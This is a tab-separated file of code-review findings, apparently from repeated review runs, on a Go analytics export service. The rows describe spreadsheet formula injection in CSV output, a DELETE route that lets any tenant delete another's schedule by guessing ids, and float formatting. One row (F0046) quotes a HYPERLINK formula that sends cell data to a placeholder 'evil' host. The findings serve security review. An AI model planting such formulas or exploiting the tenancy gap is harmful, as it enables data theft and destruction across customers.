id	arm	review	part	severity	target	file	title	what_is_wrong
F0011	W	16	b	Minor	(other)	internal/exports/worker.go — `formatValue`, `default: return fmt.Sprint(t)`	CSV cells are written unescaped against spreadsheet formula interpretation	A cell whose value begins with `=`, `+`, `-` or `@` is executed as a formula when the exported CSV is opened in a spreadsheet, and whether these datasets can contain end-user-supplied text is not visible in the change.
F0012	W	22	b	Major	(other)	`internal/exports/worker.go` — `formatValue` / the CSV branch of `serialize`; `contentType` returning `text/csv`	CSV cells are written unescaped into a file documented for spreadsheet consumption (formula injection)	`formatValue` returns column values verbatim and `csv.Writer` quotes only for CSV structure, so a value beginning with `=`, `+`, `-`, `@`, tab or CR is a formula to Excel, Google Sheets and LibreOffice — and the values are analytics event columns, which carry externally-originated payloads by construction.
F0013	W	12	a	Major	(other)	`internal/exports/worker.go` — `formatValue` and the CSV branch of `serialize`	CSV cells are written verbatim, so customer data becomes spreadsheet formulas	values are rendered with `fmt.Sprint` and written straight to `csv.Writer` with no neutralisation of the leading `=`, `+`, `-`, `@`, tab, or CR characters that Excel, LibreOffice, and Sheets interpret as the start of a formula, and the exported rows are end-user-supplied analytics data.
F0014	W23	7	a	Minor	(other)	`internal/exports/worker.go` — `formatValue` / the CSV branch of `serialize`	CSV cells are written without formula-injection guarding	A string value beginning `=`, `+`, `-` or `@` is written unescaped, and spreadsheet applications interpret such a cell as a formula when the exported file is opened.
F0015	W	10	b	Minor	(other)	`internal/exports/worker.go` — `formatValue` / the `out.Write(record)` call in `serialize`.	CSV cells are written without formula-injection guarding	values beginning with `=`, `+`, `-`, `@`, tab or CR are written verbatim, and event properties in the exported datasets are attacker-influenceable by the customer's own end users.
F0016	W	5	b	Major	(other)	internal/exports/worker.go — `formatValue` and the `out.Write(record)` call in `serialize`	CSV cells are written without formula-injection neutralisation	Values originate in customer-submitted analytics event data and are written into CSV cells verbatim, so a cell beginning with `=`, `+`, `-`, `@`, tab or CR is interpreted as a formula by Excel, LibreOffice and Google Sheets when the exported file is opened.
F0017	W	12	c	Minor	(other)	`internal/exports/worker.go` — `formatValue` / `serialize` CSV branch	CSV cells are written without formula-injection neutralisation	customer-submitted event values pass into CSV cells unmodified, so a value beginning `=`, `+`, `-`, `@`, tab or carriage return is interpreted as a formula by spreadsheet applications.
F0018	W23	10	a	Major	(other)	`internal/exports/worker.go` — `formatValue` and the CSV branch of `serialize`	CSV cells are written without neutralising leading formula characters	`formatValue` returns customer-supplied string data verbatim, so a value beginning with `=`, `+`, `-`, `@`, tab or CR is written into the CSV unchanged and is interpreted as a formula by the spreadsheet that opens it (RS6: the output crosses into an interpreter without the escaping that interpreter's syntax requires).
F0019	W23	2	c	Minor	(other)	`internal/exports/worker.go` — `formatValue` / the CSV branch of `serialize`	CSV cells are written without neutralizing leading formula characters	`encoding/csv` quotes correctly for CSV parsers but performs no spreadsheet-level neutralization, so a value beginning with `=`, `+`, `-`, `@`, tab or carriage return is interpreted as a formula when the exported file is opened in a spreadsheet, and analytics event fields are frequently attacker-supplied.
F0020	W	22	a	Minor	(other)	`internal/exports/worker.go` — `formatValue` / the CSV branch of `serialize`	CSV cells beginning with `=`, `+`, `-` or `@` are formula-injection payloads	values are written to CSV with no leading-metacharacter neutralization, so an attacker-controlled string stored in the analytics dataset executes when the customer opens the export in a spreadsheet.
F0021	W23	22	b	Minor	(other)	internal/exports/worker.go — `formatValue`, `serialize` CSV branch	CSV cells beginning with a formula character are written unescaped	values starting with `=`, `+`, `-`, `@`, tab or CR go into the CSV verbatim.
F0022	W	9	b	Major	(other)	`internal/exports/worker.go` — `formatValue`, and its use in the `FormatCSV` branch of `serialize`	CSV export of end-user-controlled values without formula-injection escaping	values are written into the CSV verbatim; `encoding/csv` quotes delimiters but does nothing about a leading `=`, `+`, `-`, `@`, tab or carriage return, and the exported rows are analytics events whose properties are supplied by the customer's own end users.
F0023	W	21	c	Major	(other)	internal/exports/worker.go — `formatValue`, and the CSV branch of `serialize`	CSV exports are not guarded against formula injection	Cell values are written verbatim, so an event field whose text begins with `=`, `+`, `-`, `@`, a tab or a carriage return is interpreted as a formula when the object is opened in a spreadsheet, and event content is ultimately supplied by the customer's own end users rather than by the customer.
F0024	W23	1	a	Minor	(other)	internal/exports/worker.go — `serialize` CSV branch, `formatValue`	CSV output is not guarded against formula-prefixed values	a text column whose value begins with `=`, `+`, `-` or `@` is written verbatim, and spreadsheet applications interpret it as a formula on open.
F0025	W23	16	a	Minor	(other)	`internal/exports/worker.go` — `formatValue`, the `[]byte` and `default` cases	CSV output is not guarded against spreadsheet formula injection	A field value beginning with `=`, `+`, `-`, or `@` is written verbatim, and spreadsheet applications interpret such a cell as a formula when the exported file is opened.
F0026	W	5	a	Minor	(other)	`internal/exports/worker.go` — `formatValue`, `default: return fmt.Sprint(t)`	CSV output is not guarded against spreadsheet formula injection	a text column whose value begins with `=`, `+`, `-` or `@` is written into the CSV unmodified, and the `analytics.events` table holds strings originating from the customer's own end users, so a crafted event property becomes an executable formula when the customer opens the exported file in a spreadsheet. Severity is held at Minor because the blast radius is confined to the customer's own tenant and their own bucket.
F0027	W23	20	c	Minor	(other)	internal/exports/worker.go — `formatValue`, the `default: return fmt.Sprint(t)` branch	CSV renders float columns in scientific notation	`fmt.Sprint` on a `float64` uses `%v`, so a large or very small double is written as `1.234e+08` rather than a plain decimal, and the test cases cover only nil, `[]byte`, `int64`, `bool` and `time.Time`.
F0028	W23	25	b	Major	(other)	internal/exports/worker.go — `formatValue`, the `default: return fmt.Sprint(t)` branch	CSV renders floating-point columns through fmt.Sprint, producing scientific notation	`fmt.Sprint` on a `float64` uses `%v`, i.e. `%g`, so a value like 1234567 is written as `1.234567e+06` and a monetary value can be written with an exponent, and the change's own test for `formatValue` covers only `nil`, `[]byte`, `int64`, `bool` and `time.Time` — the float case is the one type that renders differently from its input and it is the one not sampled.
F0029	W23	2	a	Minor	(other)	internal/exports/worker.go — `formatValue` (the `default: return fmt.Sprint(t)` branch)	CSV renders floats in Go's default syntax	`fmt.Sprint` on a `float64` produces Go's shortest representation, so a value like 1000000 is written as `1e+06`, and `TestFormatValueRendersScalarsForCSV` covers only nil, `[]byte`, `int64`, `bool` and `time.Time`.
F0030	W23	11	a	Minor	(other)	`internal/exports/worker.go` — `formatValue`'s `default` branch	CSV renders floats through `fmt.Sprint`	a `float64` reaches `fmt.Sprint`, which switches to exponent form for large or small magnitudes (`1e+06`), so numeric columns can arrive in a form a naive CSV loader rejects. Add a `float64` case using `strconv.FormatFloat(t, 'f', -1, 64)`.
F0031	W	17	a	Minor	(other)	internal/exports/worker.go — `formatValue`, `out.Write(record)`	CSV values are emitted without formula-injection guarding	`encoding/csv` quotes delimiters correctly but does nothing about a value beginning `=`, `+`, `-` or `@`, and event data contains end-user-supplied strings.
F0032	W	22	c	Minor	(other)	`internal/exports/worker.go` — `formatValue` / the CSV branch of `serialize`	CSV values are not guarded against spreadsheet formula interpretation	A text column whose value begins with `=`, `+`, `-` or `@` is written unmodified, and spreadsheet applications interpret such a cell as a formula on open.
F0033	W23	24	b	Minor	(other)	internal/exports/worker.go — `formatValue` / the CSV branch of `serialize`	CSV values are not neutralised against spreadsheet formula interpretation	A cell whose value begins with `=`, `+`, `-` or `@` is written unescaped, and spreadsheet applications evaluate it as a formula when the exported file is opened.
F0034	W23	18	c	Minor	(other)	`internal/exports/worker.go` — `formatValue` / the CSV branch of `serialize`	CSV values are not neutralised against spreadsheet formula interpretation	a customer's own event data can contain values beginning `=`, `+`, `-` or `@`, which Excel and Sheets evaluate as formulas when the exported CSV is opened.
F0035	W23	11	b	Major	(other)	`internal/exports/worker.go` — `formatValue`, `serialize` CSV branch	CSV values are not neutralized against spreadsheet formula injection	`formatValue` returns cell values verbatim, so an event field whose value begins with `=`, `+`, `-`, `@`, tab, or CR is written into the CSV as-is and is interpreted as a formula by Excel, LibreOffice, and Google Sheets when the customer opens the file.
F0036	W23	5	c	Major	(other)	`internal/exports/worker.go` — `formatValue` / the CSV branch of `serialize`	CSV values are written unescaped into a spreadsheet-executable format	Values from the analytics tables — which hold data submitted by the customer's own end users (URLs, names, referrers) — are written into CSV cells with no neutralisation of the leading `=`, `+`, `-`, `@`, tab or CR that make a cell a formula.
F0037	W23	12	b	Minor	(other)	internal/exports/worker.go — `formatValue` and the CSV branch of `serialize`	CSV values are written verbatim, so a leading `=` becomes a live formula	no guard exists for values whose first character is `=`, `+`, `-`, `@`, tab or carriage return, so an end-user-supplied event property carrying one is written into the CSV unchanged.
F0038	W	23	a	Major	(other)	internal/exports/worker.go — `serialize` CSV branch / `formatValue`	CSV values are written verbatim, so exports carry spreadsheet formula injection	rendered values go into the CSV with no leading-metacharacter guard, and the exported dataset columns (event names, URLs, user agents) carry content originating from the customer's own end users, so a value beginning with `=`, `+`, `-`, `@`, tab or CR is interpreted as a formula by the spreadsheet the export exists to be opened in.
F0039	W	15	b	Minor	(other)	internal/exports/worker.go — `formatValue` / the CSV branch of `serialize`	CSV values are written without formula-injection guarding	a value beginning with `=`, `+`, `-`, `@`, tab or CR is written verbatim, and spreadsheet software treats it as a formula when the exported file is opened.
F0040	W23	22	c	Minor	(other)	internal/exports/worker.go — `serialize`, `record[i] = formatValue(values[i])`	CSV values are written without formula-injection neutralisation	A cell whose value begins with `=`, `+`, `-` or `@` is interpreted as a formula by spreadsheet applications, and the values here are customer event data that may itself have been supplied by a third party.
F0041	W23	6	a	Minor	(other)	internal/exports/worker.go — `formatValue`, CSV branch of `serialize`	CSV values are written without formula-injection neutralisation	A cell whose value begins with `=`, `+`, `-` or `@` is written unescaped, and the documented output is a `.csv` a customer will open in a spreadsheet.
F0042	W23	25	c	Major	(other)	internal/exports/worker.go — `serialize` CSV branch / `formatValue`	CSV values are written without formula-injection neutralisation	Row values that begin with `=`, `+`, `-`, `@`, tab or CR are written verbatim into the CSV, and analytics rows contain end-user-supplied strings (event names, URLs, custom properties).
F0043	W	6	c	Minor	(other)	internal/exports/worker.go — `formatValue`, whose output goes straight into `out.Write(record)`	CSV values are written without neutralizing leading formula characters	a value beginning `=`, `+`, `-`, `@`, tab or CR is written verbatim, and spreadsheet software interprets it as a formula when the exported CSV is opened.
F0044	W	9	c	Minor	(other)	internal/exports/worker.go — `formatValue` / the CSV branch of `serialize`	CSV values beginning with `=`, `+`, `-` or `@` are emitted unescaped	no formula-injection guard is applied before writing a cell, so a stored event field starting with `=` is interpreted as a formula when the exported file is opened in a spreadsheet.
F0045	W23	10	c	Minor	(other)	`internal/exports/worker.go` — `formatValue`, and the `out.Write(record)` call in `serialize`	CSV values beginning with `=`, `+`, `-` or `@` are spreadsheet formulas	Analytics rows carry customer-supplied strings and nothing prefixes or quotes a leading formula character, so a value like `=HYPERLINK(...)` is a live formula when the exported CSV is opened in a spreadsheet.
F0046	W	14	b	Minor	(other)	`internal/exports/worker.go` — `formatValue`, `default: return fmt.Sprint(t)`	CSV values beginning with `=`, `+`, `-` or `@` execute when the customer opens the file	"exported cell values are written to CSV verbatim, and analytics event fields are frequently attacker-influenced end-user input, so a value like `=HYPERLINK(""http://evil/""&A1)` survives into the customer's file."
F0047	W23	15	c	Minor	(other)	internal/exports/worker.go — `formatValue`, `serialize` CSV branch	CSV values beginning with a formula character are written unescaped	a stored value starting with `=`, `+`, `-` or `@` is written verbatim, and spreadsheet software interprets it as a formula on open.
F0048	W	3	c	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} deletes any org's schedule	The handler never reads `auth.OrgFromContext` and `Store.Delete` runs `DELETE FROM export_schedules WHERE id = $1`, so an authenticated caller deletes any tenant's schedule by guessing an integer id, while the sibling read path `ListByOrg` on the same store is correctly scoped by `org_id`.
F0049	W	6	b	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} deletes any org's schedule	`delete` parses the path id and calls `h.store.Delete(r.Context(), id)`, whose SQL is `DELETE FROM export_schedules WHERE id = $1` with no org predicate, while the sibling read path in the same handler file scopes correctly (`h.store.ListByOrg(r.Context(), org.ID)` at exports.go, backed by `WHERE org_id = $1`) — the tenancy pattern was propagated to the read path and not to the write path, and `delete` never even reads `auth.OrgFromContext`.
F0050	W23	25	b	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} deletes any org's schedule	`delete` reads `id` from the path and calls `h.store.Delete(r.Context(), id)` with no org predicate, while every sibling path in the same diff carries one (`create` sets `OrgID: org.ID` from `auth.OrgFromContext`, `ListByOrg` filters `WHERE org_id = $1`) — the tenancy predicate was propagated to two of three handlers.
F0051	W	16	c	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`, and internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} deletes any org's schedule	the handler resolves `id` from the path and calls `h.store.Delete(ctx, id)` whose SQL is `DELETE FROM export_schedules WHERE id = $1`, with no `org_id` predicate anywhere on the path, while the sibling read path `ListByOrg` correctly scopes on `WHERE org_id = $1` (R3, security-relevant → Critical).
F0052	W23	22	c	Critical	(other)	internal/api/exports.go — `exportHandler.delete`; internal/exports/model.go — `Store.Delete`	DELETE /v1/export-schedules/{id} deletes any org's schedule (no tenancy predicate)	`delete` takes the id straight from the path and calls `h.store.Delete(ctx, id)`, whose SQL is `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, while the sibling read path `ListByOrg` does scope by `org.ID` — `auth.OrgFromContext` is fetched in `create` and `list` but never in `delete`.
F0053	W23	15	c	Critical	(other)	internal/api/exports.go — `exportHandler.delete`; internal/exports/model.go — `Store.Delete`	DELETE /v1/export-schedules/{id} has no tenancy check — any org can delete any org's schedule	`delete` is the only one of the three handlers that never calls `auth.OrgFromContext`, and `Store.Delete` executes `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, so an authenticated caller from org A deletes org B's schedule by guessing a `BIGSERIAL` id.
F0054	W23	2	b	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} has no tenancy check — any org can delete any org's schedule	`delete` never calls `auth.OrgFromContext` (both sibling handlers, `create` and `list`, do) and `Store.Delete` runs `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, so ownership is never checked on a `BIGSERIAL` id that is trivially enumerable.
F0055	W23	20	c	Critical	(other)	internal/api/exports.go — `exportHandler.delete`; internal/exports/model.go — `Store.Delete`	DELETE /v1/export-schedules/{id} has no tenancy check — any org can delete any org's schedule	`delete` never calls `auth.OrgFromContext` (the call both `create` and `list` make two functions above it) and `Store.Delete` issues `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, so ownership is never checked on the one destructive route.
F0056	W23	7	a	Critical	(other)	`internal/api/exports.go` — `exportHandler.delete`; `internal/exports/model.go` — `Store.Delete`	DELETE /v1/export-schedules/{id} has no tenancy check — any org can delete any org's schedule	`delete` takes `id` straight from the path and calls `h.store.Delete(ctx, id)`, whose SQL is `DELETE FROM export_schedules WHERE id = $1`, so the `org` already loaded by `auth.OrgFromContext` in `create`/`list` is never consulted on the one destructive route.
F0057	W	6	c	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} has no tenancy predicate	`delete` never calls `auth.OrgFromContext` and the store runs `DELETE FROM export_schedules WHERE id = $1` with no `org_id` column in the predicate, while the sibling read path in the same store, `ListByOrg`, does scope by org — the tenancy pattern was applied to one method and not propagated to the other (R3, security-relevant).
F0058	W	9	b	Critical	(other)	`internal/api/exports.go` — `exportHandler.delete`; `internal/exports/model.go` — `Store.Delete`	DELETE /v1/export-schedules/{id} has no tenancy predicate	`delete` never reads `auth.OrgFromContext` and `Store.Delete` runs `DELETE FROM export_schedules WHERE id = $1`, while the two sibling handlers in the same file (`create` sets `OrgID: org.ID`, `list` calls `ListByOrg(ctx, org.ID)`) both scope by org — the tenancy pattern was propagated to two of three new routes (R3, security-relevant).
F0059	W	16	b	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} has no tenancy predicate — any authenticated org can delete any org's schedule	`delete` never calls `auth.OrgFromContext` (unlike `create` and `list` in the same file, which both scope on `org.ID`) and `Store.Delete` runs `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, while the sibling read path `ListByOrg` does apply exactly that predicate — the org-scoping pattern was propagated to two of the three handlers.
F0060	W23	23	b	Critical	(other)	`internal/api/exports.go` — `exportHandler.delete`; `internal/exports/model.go` — `Store.Delete`	DELETE /v1/export-schedules/{id} has no tenancy predicate — any org can delete any org's schedule	`delete` reads `org := auth.OrgFromContext` nowhere and calls `h.store.Delete(ctx, id)`, whose SQL is `DELETE FROM export_schedules WHERE id = $1` with no `org_id` term, so the caller's identity never constrains the row.
F0061	W23	1	b	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} has no tenancy predicate — any org can delete any org's schedule	`delete` takes the id straight from the path and calls `h.store.Delete(ctx, id)`, whose SQL is `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, while the two sibling handlers in the same file both derive `org := auth.OrgFromContext(r.Context())` and `ListByOrg` carries the org through to the `WHERE org_id = $1` clause — the tenancy pattern exists in the change and this one call site skips it (R3, security-relevant).
F0062	W	7	a	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} has no tenancy predicate — any org can delete any other org's schedule	`delete` never calls `auth.OrgFromContext` and `Store.Delete` runs `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, while the two sibling handlers in the same file do scope by org (`create` sets `OrgID: org.ID`, `list` calls `ListByOrg(ctx, org.ID)`).
F0063	W23	3	b	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`, and internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} is not scoped to the caller's org	The handler never calls `auth.OrgFromContext` and `Store.Delete` runs `DELETE FROM export_schedules WHERE id = $1`, so any authenticated org can delete any other org's schedule by guessing a BIGSERIAL id, while the sibling handlers (`create` sets `OrgID: org.ID`, `list` calls `ListByOrg(ctx, org.ID)`) do scope by org.
F0064	W	10	a	Critical	(other)	internal/api/exports.go — `exportHandler.delete`; internal/exports/model.go — `Store.Delete`	DELETE /v1/export-schedules/{id} is not scoped to the caller's org	The handler never reads `auth.OrgFromContext` and `Store.Delete` issues `DELETE FROM export_schedules WHERE id = $1`, so any authenticated org can delete any other org's schedule by guessing a `BIGSERIAL` id, while the sibling read path `ListByOrg` does scope with `WHERE org_id = $1` (R3, security-relevant).
F0065	W23	24	b	Critical	(other)	internal/api/exports.go — `exportHandler.delete`; internal/exports/model.go — `Store.Delete`	DELETE /v1/export-schedules/{id} is not scoped to the caller's org	The handler parses `id` from the path and calls `h.store.Delete(ctx, id)` without ever reading `auth.OrgFromContext(r.Context())`, and `Store.Delete` issues `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, so any authenticated org can delete any other org's schedule by guessing a `BIGSERIAL` id.
F0066	W23	12	a	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`, and internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} is not scoped to the caller's org	The handler parses `id` from the path and calls `h.store.Delete(ctx, id)`, whose SQL is `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, even though the sibling read path in the same file (`list` → `ListByOrg`) scopes by `auth.OrgFromContext(r.Context()).ID` and the org is equally available in `delete`.
F0067	W23	7	b	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} is not scoped to the caller's org	The handler parses `id` from the path and calls `h.store.Delete(ctx, id)`, whose SQL is `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, while the sibling read path `ListByOrg` does scope on `org_id = $1` — the org from `auth.OrgFromContext` is fetched nowhere in `delete`.
F0068	W	19	c	Critical	(other)	internal/api/exports.go — `exportHandler.delete`; internal/exports/model.go — `Store.Delete`	DELETE /v1/export-schedules/{id} is not scoped to the caller's org	The handler reads the id from the path and calls `h.store.Delete(r.Context(), id)` without ever consulting `auth.OrgFromContext`, and the query is `DELETE FROM export_schedules WHERE id = $1`, so any authenticated org can delete any other org's schedule by guessing a BIGSERIAL id — the sibling read path `ListByOrg` in the same file does scope by org (`WHERE org_id = $1`), so the tenancy predicate exists in this change and was simply not propagated to the destructive path (R3, security-relevant).
F0069	W23	25	c	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`, and internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} is not scoped to the caller's org	The handler takes an integer id straight from the path and calls `h.store.Delete(ctx, id)`, whose SQL is `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, while the sibling read path in the same file (`ListByOrg` → `WHERE org_id = $1`) shows the tenancy predicate the codebase already uses.
F0070	W23	8	c	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} is not scoped to the caller's org	`create` and `list` both derive the tenant with `auth.OrgFromContext(r.Context())` and scope on it (`OrgID: org.ID`, `ListByOrg(ctx, org.ID)`), but `delete` never reads the org and `Store.Delete` runs `DELETE FROM export_schedules WHERE id = $1`, so any authenticated org can delete any other org's schedule by guessing a BIGSERIAL id.
F0071	W	23	b	Critical	(other)	internal/api/exports.go — `exportHandler.delete`; internal/exports/model.go — `Store.Delete`	DELETE /v1/export-schedules/{id} is not scoped to the caller's org	`create` and `list` both read `org := auth.OrgFromContext(r.Context())` and constrain on `org.ID`, while `delete` never reads the org and `Store.Delete` executes `DELETE FROM export_schedules WHERE id = $1` with no tenancy predicate.
F0072	W	15	c	Critical	(other)	internal/api/exports.go — `(*exportHandler).delete`; internal/exports/model.go — `(*Store).Delete`	DELETE /v1/export-schedules/{id} is not scoped to the caller's org	`delete` is the only one of the three handlers that never calls `auth.OrgFromContext(r.Context())`, and `Store.Delete` issues `DELETE FROM export_schedules WHERE id = $1` with no `org_id` predicate, so any authenticated org can delete any other org's schedule by guessing a `BIGSERIAL` id.
